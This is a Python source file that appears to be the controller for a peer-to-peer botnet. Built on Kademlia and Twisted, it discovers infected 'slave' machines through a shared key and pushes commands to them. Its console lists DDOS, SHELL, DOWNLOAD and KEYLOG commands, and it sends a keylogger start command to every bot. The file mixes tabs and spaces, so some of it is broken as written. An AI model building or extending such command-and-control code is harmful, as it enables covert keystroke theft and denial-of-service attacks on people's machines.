from kademlia.network import Server
from twisted.protocols import basic
from twisted.internet import reactor, task, defer, stdio
from collections import deque
from twisted.python import log
import sys
import hashlib

class SlaveDriver(basic.LineReceiver):
    from os import linesep as delimiter
    import hashlib
    

    def __init__(self,kserver,key):
    	self.state = "GETCMD"
    	self.kserver = kserver
        self.key = key
        self.slaves = {}
        self.slaveloop = task.LoopingCall(self.checknewslave)
        self.slaveloop.start(5)
        # self.kserver.listen(8468)
        # self.kserver.bootstrap([("192.168.56.101", 8468)])
    	self.queue = deque()
    	#self.slaves = 
    def checknewslave(self):
        def addslave(val):
            print "Val: ",val
            if val:
                if val not in self.slaves:
                    print "New slave found"
                    valhash = hashlib.sha1()
                    valhash.update(str(val))
                    newval = valhash.hexdigest()
                    self.slaves[val]=newval
                    #commands.updateslaves(slaves)
                    self.kserver.set(self.slaves[val], str(val))
                    for key, value in self.slaves.iteritems():
                        print key, value
        self.kserver.get(self.key).addCallback(addslave)
    #this function will send command at the hash[bot's id]
    
    def parsecommands(self,cmd):
        #def sendcommand(cmd,botid):
        #self.server.set(self.slaves[botid],cmd)
        if cmd == 'KEYLOG':
            for key,val in self.slaves.iteritems():
                output = 'Starting keylogger for bot {0}'.format(key)
                self.transport.write(output)
                self.kserver.set(val,cmd)
    
    def connectionMade(self):
        self.transport.write('>>> ')

    def lineReceived(self, line):
        #self.sendLine('Executing: ' + line)
        self.handlecmd(line)
        self.transport.write('>>> ')
    # def updateslaves(self,slaves):
    # 	self.slaves = slaves

    def finishcmd(self):
    	self.queue.popleft()
    def handlecmd(self, line):
    	commands = ['LIST','DDOS','SHELL','DOWNLOAD','KEYLOG']
    	#parse out actual command
    	tmp = line.split(' ',1)
    	cmd = tmp[0].upper()
    	# args = None
    	# if len(tmp) == 2:
    	# 	args = tmp[1].upper()
    	if cmd not in commands:
    		self.transport.write('Invalid Command\n')
    		self.transport.write('Valid commands are: LIST, DDOS [ip], SHELL [ip], DOWNLOAD [ip], KEYLOG [ip] \n')
    		#self.transport.write('>>> ')
    		self.state = "GETCMD"
    	else:
    		#self.slaves = slaves
            self.parsecommands(cmd)
    		# if args:
    		# 	self.queue.append({cmd:args})
    		# if not args:
    		# 	self.queue.append({cmd:None})
log.startLogging(sys.stdout)
kserver = Server()
kserver.listen(8468)
kserver.bootstrap([("192.168.56.101", 8468)])
key = hashlib.sha1()
key.update('specialstring')
keyhash = key.hexdigest()
stdio.StandardIO(SlaveDriver(kserver,keyhash))
reactor.run()